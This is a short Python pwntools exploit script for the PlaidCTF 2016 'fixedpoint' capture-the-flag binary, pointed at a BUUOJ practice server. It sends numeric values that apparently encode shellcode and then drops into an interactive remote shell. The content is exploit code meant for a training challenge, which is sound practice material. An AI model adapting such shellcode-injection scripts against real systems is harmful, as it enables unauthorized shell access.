#!/usr/bin/python2.7  
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "i386"
elf = ELF("fixedpoint_plaid_2016")
sh = 0
lib = 0
def write(num):
	sh.sendline(str(num))
	sleep(0.1)
	sh.sendline("395841308")
	sleep(0.1)
	sh.sendline("175700696")
	sleep(0.1)
	sh.sendline("177668635")
def send(num):
	sh.sendline(str(num))
	sleep(0.1)
def pwn(ip,port,debug):
	global sh
	global lib
	if(debug == 1):
		sh = process("./fixedpoint_plaid_2016")

	else:
		sh = remote(ip,port)
	send(443750948)
	write(394804464)
	write(395349960)
	write(395424832)
	write(395478312)
	write(394804464)
	write(394804464)
	write(395531792)
	write(395414136)
	write(394301752)
	send(188835259)
	send(275002318)
	send(247465383)
	send(274506417)
	sh.sendline("a")
	sh.interactive()
if __name__ == "__main__":
	pwn("node3.buuoj.cn",25126,0)